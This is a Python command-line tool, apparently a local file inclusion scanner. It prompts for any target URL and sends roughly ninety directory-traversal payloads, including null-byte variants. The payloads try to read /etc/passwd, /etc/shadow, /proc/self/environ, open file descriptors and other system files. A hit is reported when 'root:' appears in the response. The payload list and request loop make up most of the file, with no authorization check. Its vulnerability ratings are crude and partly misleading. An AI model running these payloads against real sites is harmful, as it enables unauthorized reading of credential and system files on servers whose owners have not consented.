import requests
import pyfiglet

ascii_banner = pyfiglet.figlet_format("LOCAL FILE INCLUSION")
print(ascii_banner)

def test_local_file_inclusion(url):
    print("Testing for Local File Inclusion (LFI) vulnerability on: " + url)
    try:
        # Send a request to the target URL
        response = requests.get(url)
        if response.status_code == 200:
            print("Website is accessible...")
            # Check for potential LFI indicators in the response content
            if 'root:' in response.text or 'etc/passwd' in response.text:
                print("High Vulnerability Detected: LFI")
                print("The target website is vulnerable to LFI, allowing access to sensitive files.")
            else:
                print("Low Vulnerability Detected: No LFI")
                print("The target website is not vulnerable to LFI.")
        else:
            print("Medium Vulnerability Detected: Website Inaccessible")
            print("Failed to access the website. Status code: " + str(response.status_code))
    except Exception as e:
        print("Medium Vulnerability Detected: Error")
        print("An error occurred: " + str(e))

def test_lfi_with_payloads(url):
    # Assigning each payload to a variable
    payloads = [
        "../../../../../../../../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../../../../../../../../etc/shadow",
        "../../../../../../../../../../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../../../../../../../../../../etc/hostname",
        "../../../../../../../../../../../../../../../../../../../proc/version",
        "../../../../../../../../../../../../../../../../../../../proc/cpuinfo",
        "../../../../../../../../../../../../../../../../../../../proc/meminfo",
        "../../../../../../../../../../../../../../../../../../../proc/sys/kernel/version",
        "../../../../../../../../../../../../../../../../../../../proc/self/environ",
        "../../../../../../../../../../../../../../../../../../../proc/net/dev",
        "../../../../../../../../../../../../../../../../../../../proc/net/tcp",
        "../../../../../../../../../../../../../../../../../../../proc/net/udp",
        "../../../../../../../../../../../../../../../../../../../proc/net/raw",
        "../../../../../../../../../../../../../../../../../../../proc/net/unix",
        "../../../../../../../../../../../../../../../../../../../proc/self/cmdline",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/0",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/1",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/2",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/3",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/4",
        "../../../../../../../../../../../../../../../../../../../etc/passwd%00",
        "../../../../../../../../../../../../../../../../../../../etc/shadow%00",
        "../../../../../../../../../../../../../../../../../../../etc/hosts%00",
        "../../../../../../../../../../../../../../../../../../../etc/hostname%00",
        "../../../../../../../../../../../../../../../../../../../proc/version%00",
        "../../../../../../../../../../../../../../../../../../../proc/cpuinfo%00",
        "../../../../../../../../../../../../../../../../../../../proc/meminfo%00",
        "../../../../../../../../../../../../../../../../../../../proc/sys/kernel/version%00",
        "../../../../../../../../../../../../../../../../../../../proc/self/environ%00",
        "../../../../../../../../../../../../../../../../../../../proc/net/dev%00",
        "../../../../../../../../../../../../../../../../../../../proc/net/tcp%00",
        "../../../../../../../../../../../../../../../../../../../proc/net/udp%00",
        "../../../../../../../../../../../../../../../../../../../proc/net/raw%00",
        "../../../../../../../../../../../../../../../../../../../proc/net/unix%00",
        "../../../../../../../../../../../../../../../../../../../proc/self/cmdline%00",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/0%00",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/1%00",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/2%00",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/3%00",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/4%00",
        "../../../../../../../../../../../../../../../../../../../etc/group",
        "../../../../../../../../../../../../../../../../../../../etc/issue",
        "../../../../../../../../../../../../../../../../../../../etc/network/interfaces",
        "../../../../../../../../../../../../../../../../../../../etc/protocols",
        "../../../../../../../../../../../../../../../../../../../proc/self/mounts",
        "../../../../../../../../../../../../../../../../../../../proc/self/status",
        "../../../../../../../../../../../../../../../../../../../proc/self/stat",
        "../../../../../../../../../../../../../../../../../../../proc/self/cwd",
        "../../../../../../../../../../../../../../../../../../../proc/self/attr/current",
        "../../../../../../../../../../../../../../../../../../../proc/self/fdinfo",
        "../../../../../../../../../../../../../../../../../../../proc/self/maps",
        "../../../../../../../../../../../../../../../../../../../proc/self/mountinfo",
        "../../../../../../../../../../../../../../../../../../../proc/self/personality",
        "../../../../../../../../../../../../../../../../../../../proc/self/statm",
        "../../../../../../../../../../../../../../../../../../../proc/self/uid_map",
        "../../../../../../../../../../../../../../../../../../../proc/self/gid_map",
        "../../../../../../../../../../../../../../../../../../../proc/self/cap_eff",
        "../../../../../../../../../../../../../../../../../../../proc/self/cap_inh",
        "../../../../../../../../../../../../../../../../../../../proc/self/cap_prm",
        "../../../../../../../../../../../../../../../../../../../proc/self/cap_bnd",
        "../../../../../../../../../../../../../../../../../../../proc/self/cap_ambient",
        "../../../../../../../../../../../../../../../../../../../proc/self/io",
        "../../../../../../../../../../../../../../../../../../../proc/self/sched",
        "../../../../../../../../../../../../../../../../../../../proc/self/smaps",
        "../../../../../../../../../../../../../../../../../../../proc/self/smaps_rollup",
        "../../../../../../../../../../../../../../../../../../../proc/self/environ",
        "../../../../../../../../../../../../../../../../../../../proc/self/cgroup",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/5",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/6",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/7",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/8",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/9",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/10",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/11",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/12",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/13",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/14",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/15",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/16",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/17",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/18",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/19",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/20",
        "../../../../../../../../../../../../../../../../../../../proc/self/fd/21",
    ]
    
    payload_vars = {f"LFI{i+1}": payload for i, payload in enumerate(payloads)}

    print("Testing for LFI vulnerability with additional payloads on: " + url)
    try:
        successful_payload = None
        for var_name, payload in payload_vars.items():
            target_url = f"{url}/{payload}"
            response = requests.get(target_url)
            if response.status_code == 200:
                if 'root:' in response.text or 'etc/passwd' in response.text:
                    metric = "high"
                    print(f"{var_name}: High Vulnerability Detected with payload: {payload}")
                    successful_payload = (var_name, payload, metric)
                    break
                else:
                    print(f"{var_name}: Low Vulnerability Detected: No LFI with payload: {payload}")
            elif response.status_code == 404:
                metric = "low"
                print(f"{var_name}: 404 Not Found: {target_url}")
            else:
                metric = "medium"
                print(f"{var_name}: Unexpected status code: {response.status_code} for {target_url}")

        if successful_payload:
            print("\nSuccessfully Injected Payload Details:")
            print(f"Variable Name: {successful_payload[0]}")
            print(f"Payload: {successful_payload[1]}")
            print(f"Vulnerability Metric: {successful_payload[2]}")
        else:
            print("No successful LFI payload found.")
    except Exception as e:
        print("Medium Vulnerability Detected: Error")
        print("An error occurred: " + str(e))

def main():
    # Prompt user for target website URL
    target_url = input("Enter your target website URL: ").strip()
    # Check if the URL starts with 'http://' or 'https://'
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url

    # Test for Local File Inclusion vulnerability
    test_local_file_inclusion(target_url)

    # Test for LFI vulnerability with additional payloads
    test_lfi_with_payloads(target_url)

if __name__ == "__main__":
    main()
